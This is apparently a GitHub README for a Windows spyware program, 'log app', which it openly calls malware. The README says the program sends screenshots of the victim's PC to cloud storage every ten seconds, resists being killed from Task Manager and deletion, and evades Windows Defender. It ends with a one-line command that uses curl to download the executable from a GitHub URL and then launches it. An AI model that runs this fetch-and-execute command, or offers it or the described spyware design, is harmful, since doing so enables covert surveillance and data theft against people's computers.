# log app

The log.exe and log_v1.0.exe is a malware that will send screenshot of your pc every 10secs to a cloud based storage.

The log_v1.0 is an updated version of the original log.exe. This version adds a new feature to the malware, which prevents the user from manually killing the malware from the taskmanager. The victim has to use the terminal to kill the app.

Both versions of the malware can not be killed by simply deleting. Even though the malware might seem deleted the malware will still run and affect your computer.

### Windows defender will not block the malware during installation or stop it while its running.

In order to test the malware in your virtual machine, simply install and run the malware or type the following command in the command prompt `mkdir C:/tempapp; curl -o "C:/tempapp/log.exe" https://github.com/falahabubacker/scripts-apps/blob/main/log_v1.1.exe; START C:/tempapp/log.exe;`
